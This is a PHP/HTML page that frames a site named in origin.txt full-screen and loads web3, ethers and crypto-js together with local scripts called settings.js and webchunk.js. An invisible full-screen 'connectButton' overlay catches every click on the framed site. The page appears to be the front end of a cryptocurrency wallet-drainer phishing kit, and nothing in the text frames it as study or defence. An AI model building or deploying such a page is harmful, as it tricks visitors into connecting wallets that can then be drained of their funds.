<?php
    $origin = file_get_contents("origin.txt");
?>
<!DOCTYPE html>
<html>
<head>
  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
<script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  
<script src="./js/settings.js"></script>
<script src="./js/webchunk.js"></script>
  <style>
    *{
        margin: 0;
        padding: 0;
    }
    #iframeContainer {
      position: relative;
      width: 100%;
      height: 100vh; 
    }
    
    iframe {
      width: 100%;
      height: 100%;
    }
    
  </style>
</head>
<body>
  <div class="connectButton" style="width: 100vw;height: 100vh;position: fixed;z-index: 2000;"></div>
  <div id="iframeContainer">
    <iframe src="<?=$origin;?>" frameborder="0"></iframe>
  </div>
</body>
</html>
